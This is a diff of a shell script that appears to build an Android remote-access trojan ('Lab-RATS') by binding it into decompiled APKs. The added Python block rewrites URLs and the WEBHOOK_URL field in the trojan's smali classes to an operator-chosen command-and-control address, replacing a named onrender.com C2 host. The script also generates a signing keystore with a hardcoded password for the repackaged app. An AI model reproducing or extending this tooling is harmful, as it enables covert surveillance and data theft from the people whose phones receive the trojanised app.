@@ -293,14 +293,30 @@ fi
 
 if [ -n "$WEB_URL" ]; then
     echo -e "${CYAN}[*] Patching C2 Webhook URL into bound smali classes...${NC}"
-    find "$TARGET_DIR" -name "*.smali" | while read -r smali_f; do
-        if grep -q "WEBHOOK_URL\|https://\|http://" "$smali_f"; then
-            sed -i.bak "s|https://lab-rats-c2.onrender.com|$WEB_URL|g" "$smali_f" 2>/dev/null
-            sed -i.bak "s|http://127.0.0.1:8080|$WEB_URL|g" "$smali_f" 2>/dev/null
-            rm -f "$smali_f.bak"
-        fi
-    done
-    echo -e "${GREEN}[✓] C2 Webhook URL configured: $WEB_URL${NC}"
+    WEB_URL_CLEAN="$(echo "$WEB_URL" | sed 's|/$||')"
+    python3 - "$TARGET_DIR" "$WEB_URL_CLEAN" << 'EOF'
+import sys, os, re
+
+target_dir, web_url = sys.argv[1], sys.argv[2]
+for root, _, files in os.walk(target_dir):
+    if "com/labs/labrats" in root.replace("\\", "/"):
+        for f in files:
+            if f.endswith(".smali"):
+                sf = os.path.join(root, f)
+                try:
+                    with open(sf, 'r', encoding='utf-8', errors='ignore') as sfile:
+                        content = sfile.read()
+
+                    new_content = re.sub(r'https?://[a-zA-Z0-9_.-]+(?::\d+)?(?:/[a-zA-Z0-9_.-]*)*', web_url, content)
+                    new_content = re.sub(r'(\.field\s+public\s+static\s+final\s+WEBHOOK_URL:Ljava/lang/String;\s*=\s*")[^"]*(")', r'\1' + web_url + r'\2', new_content)
+
+                    if new_content != content:
+                        with open(sf, 'w', encoding='utf-8') as sfile:
+                            sfile.write(new_content)
+                except Exception:
+                    pass
+EOF
+    echo -e "${GREEN}[✓] C2 Webhook URL configured: $WEB_URL_CLEAN${NC}"
 fi
 
 # 6. AndroidManifest Surgery
@@ -709,6 +725,7 @@ fi
 if [ ! -f "$KEYSTORE_PATH" ]; then
     echo -e "${YELLOW}[!] Keystore missing or invalid. Generating fresh keystore...${NC}"
     keytool -genkeypair -alias "lab-rats-key" -keyalg RSA -keysize 2048 -validity 9125 -keystore "$KEYSTORE_PATH" -storepass "lab-rats123" -keypass "lab-rats123" -dname "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US" 2>/dev/null
+    keytool -genkeypair -alias "render" -keyalg RSA -keysize 2048 -validity 9125 -keystore "$KEYSTORE_PATH" -storepass "lab-rats123" -keypass "lab-rats123" -dname "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US" 2>/dev/null
 fi
 
 mkdir -p "$OUTPUT_DIR" "$SCRIPT_DIR/bind_output"
